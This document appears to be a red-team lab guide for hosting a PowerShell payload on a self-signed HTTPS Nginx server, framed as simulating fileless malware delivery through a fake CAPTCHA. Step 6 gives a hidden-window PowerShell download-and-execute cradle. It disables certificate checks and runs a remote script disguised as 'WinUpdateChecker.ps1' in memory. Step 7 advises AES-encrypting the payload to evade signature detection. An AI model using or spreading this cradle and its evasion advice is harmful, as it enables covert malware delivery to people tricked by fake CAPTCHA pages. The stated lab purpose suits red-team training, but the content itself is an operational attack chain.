# 🛠️ Fileless Malware Lab Setup with Self-Signed HTTPS & Nginx

This guide documents the process of setting up a local HTTPS web server using a self-signed SSL certificate to serve PowerShell payloads, ideal for simulating **fileless malware delivery via fake CAPTCHA**.

---

## 📁 1. Create SSL Certificate

Create a directory and generate a self-signed certificate valid for 1 year:

```bash
mkdir -p ~/ssl && cd ~/ssl

openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout selfsigned.key \
  -out selfsigned.crt \
  -subj "/CN=192.168.10.52"
```

---

## 📂 2. Move SSL Certificate to Nginx

Move the generated certificate and private key to a directory readable by Nginx:

```bash
sudo mkdir -p /etc/nginx/ssl
sudo cp selfsigned.crt selfsigned.key /etc/nginx/ssl/
```

---

## ⚙️ 3. Configure Nginx

Edit your Nginx configuration:

```bash
sudo nano /etc/nginx/nginx.conf
```

Add or modify the following server block for HTTPS:

```nginx
server {
    listen 443 ssl;
    server_name 192.168.10.52;

    ssl_certificate     /etc/nginx/ssl/selfsigned.crt;
    ssl_certificate_key /etc/nginx/ssl/selfsigned.key;

    root /srv/http/malware-lab;
    index index.html;

    location / {
        try_files $uri $uri/ =404;
    }
}
```

---

## 🌐 4. Restart Nginx

Apply the changes by restarting Nginx:

```bash
sudo systemctl restart nginx
```

---

## 🧪 5. Test Access

Ensure your payload is in `/srv/http/malware-lab/`:

```bash
ls /srv/http/malware-lab/
index.html  WinUpdateChecker.ps1
```

Open in browser to test:

```
https://192.168.10.52/WinUpdateChecker.ps1
```

---

## ⚔️ 6. PowerShell Payload Execution

Use this command to bypass SSL validation and execute the script remotely:

```powershell
powershell -w hidden -nop -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $u='https://192.168.10.52/WinUpdateChecker.ps1'; iex (New-Object Net.WebClient).DownloadString($u)"
```

---
## 🔐 7. Creating an AES-Encrypted Payload

To avoid static signature detection or simple network-based payload grabbing, you can encrypt your PowerShell script using AES-CBC and only decrypt it in-memory during execution.

```powershell
pwsh AESEncryptor.ps1 -PlainTextPath "payload.txt"
```

## 📌 Notes

* This setup is intended **for lab or red team simulation only**.
* The self-signed certificate is not trusted by default; PowerShell bypass is necessary.
